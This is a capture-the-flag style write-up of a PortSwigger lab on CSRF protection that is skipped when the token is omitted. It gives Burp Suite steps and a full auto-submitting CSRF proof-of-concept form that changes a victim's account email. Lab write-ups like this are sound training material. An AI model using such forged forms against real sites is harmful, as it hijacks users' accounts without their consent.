## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1bfc7efb-14b0-47ea-9e8f-7433e993cea0)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a309514d-3d65-4e64-8889-7a2c8783ff46)

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0fe001e7-9450-4137-96cb-a7e6946f6c0e)

Delete the csrf parameter entirely and observe that the request is now accepted

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/15cbb67d-c2aa-49d7-8105-e9860bd04aa9)

Right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/10a03b1b-ccff-43a3-9033-18ede5d623f8)

payload-

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0adf00c3040b709485c9716a003b00c4.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="cyber&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```

Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".And then i changed the email from cyber to ananthan.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ee2e7053-5f2e-4d85-88ee-882605076795)


To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/63aee621-9cf4-463c-b368-9ee1ef13c0c5)

Store the exploit, then click "Deliver to victim" to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7a1d9f40-e9f2-49d2-85bc-e5b7ce20ead7)
